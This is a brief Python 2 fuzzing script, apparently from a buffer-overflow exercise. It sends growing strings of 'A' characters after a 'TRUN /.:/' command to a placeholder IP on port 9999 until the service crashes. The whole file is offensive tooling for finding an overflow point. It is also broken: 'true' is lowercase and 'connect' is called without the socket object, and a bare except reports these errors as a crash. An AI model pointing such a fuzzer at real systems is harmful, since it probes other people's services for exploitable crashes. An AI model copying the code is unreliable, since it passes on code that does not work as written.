#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100 

while true:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s=connect(('pasteIPhere', 9999))

		s.send(('TRUN /.:/' + buffer))
		s.close()
		sleep(1)
		buffer = buffer + "A" * 100

	except:
		print"Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()
